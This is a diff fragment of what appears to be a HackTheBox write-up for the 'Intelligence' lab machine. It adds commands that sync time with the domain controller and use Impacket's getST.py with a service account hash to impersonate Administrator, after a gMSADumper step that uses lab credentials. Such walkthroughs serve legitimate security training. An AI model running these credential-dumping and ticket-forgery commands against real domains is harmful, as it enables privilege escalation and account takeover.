@@ -151,3 +151,12 @@ git clone https://github.com/micahvandeusen/gMSADumper
 python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/e55febe9-ae9e-44b8-abfb-3943221b8723)
+
+```
+echo "10.10.10.248 intelligence.htb" | sudo tee -a /etc/hosts
+sudo service virtualbox-guest-utils stop
+sudo apt install ntpdate
+sudo ntpdate -s 10.10.10.248
+./getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51e4932f13712047027300f869d07ab6
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/508ab84c-0a82-4734-94cf-55a4fd860095)
